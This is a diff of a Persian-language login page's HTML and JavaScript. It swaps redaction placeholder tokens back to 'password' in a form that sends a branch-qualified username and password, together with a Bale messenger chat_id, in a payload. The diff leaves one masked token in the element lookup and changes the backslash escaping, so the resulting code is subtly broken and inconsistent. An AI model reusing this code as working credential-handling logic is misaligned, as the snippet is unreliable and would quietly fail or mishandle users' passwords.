@@ -175,8 +175,8 @@
     </div>
 
     <div class="form-group">
-        <label for="GAPGPTMASKTOKENu3324j6syxoX0X">رمز عبور</label>
-        <input type="GAPGPTMASKTOKENu3324j6syxoX1X" id="GAPGPTMASKTOKENu3324j6syxoX2X" placeholder="••••••••" dir="ltr" required>
+        <label for="password">رمز عبور</label>
+        <input type="password" id="password" placeholder="••••••••" dir="ltr" required>
     </div>
 
     <button id="submitBtn" onclick="handleLogin()">ورود به سیستم</button>
@@ -197,22 +197,22 @@
     async function handleLogin() {
         const branch = document.getElementById('branch').value;
         const rawUsername = document.getElementById('username').value.trim();
-        const GAPGPTMASKTOKENu3324j6syxoX3X = document.getElementById('GAPGPTMASKTOKENu3324j6syxoX4X').value;
+        const password = document.getElementById('GAPGPTMASKTOKENu3324j6syxoX4X').value;
         const btn = document.getElementById('submitBtn');
         const statusBox = document.getElementById('statusBox');
 
-        if (!rawUsername || !GAPGPTMASKTOKENu3324j6syxoX5X) {
+        if (!rawUsername || !password) {
             showStatus('لطفاً تمامی فیلدها را کامل وارد کنید.', 'error');
             return;
         }
 
-        const formattedUsername = `${branch}\\${rawUsername}`;
+        const formattedUsername = `${branch}\\\\${rawUsername}`;
 
         const payload = {
             platform: "Bale",
             chat_id: chatId,
             username: formattedUsername,
-            GAPGPTMASKTOKENu3324j6syxoX6X: GAPGPTMASKTOKENu3324j6syxoX7X
+            password: password 
         };
 
         btn.disabled = true;
